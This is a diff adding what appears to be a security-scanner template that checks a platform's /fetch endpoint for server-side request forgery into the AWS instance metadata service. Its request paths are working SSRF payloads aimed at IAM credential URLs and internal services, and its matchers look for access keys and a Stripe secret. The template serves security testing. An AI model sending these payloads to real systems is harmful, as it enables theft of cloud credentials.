@@ -1,0 +1,32 @@
+id: platform-ssrf-metadata
+
+info:
+  name: SSRF to AWS Instance Metadata Service
+  author: deploysapp-sectest
+  severity: critical
+  description: |
+    Tests whether the /fetch endpoint can be used to reach the AWS EC2 instance
+    metadata service (169.254.169.254 or internal equivalent). If successful,
+    attackers can steal IAM credentials.
+  tags: ssrf,paas,aws,metadata,critical
+  reference:
+    - https://cwe.mitre.org/data/definitions/918.html
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://metadata.internal/latest/meta-data/iam/security-credentials/deploysapp-ec2-role"
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/fetch?url=http://internal-service:9000/"
+    headers:
+      Host: webapp.localhost
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "AKIAIOSFODNN7EXAMPLE"
+          - "internal-billing"
+          - "stripe_secret_key"
+        condition: or
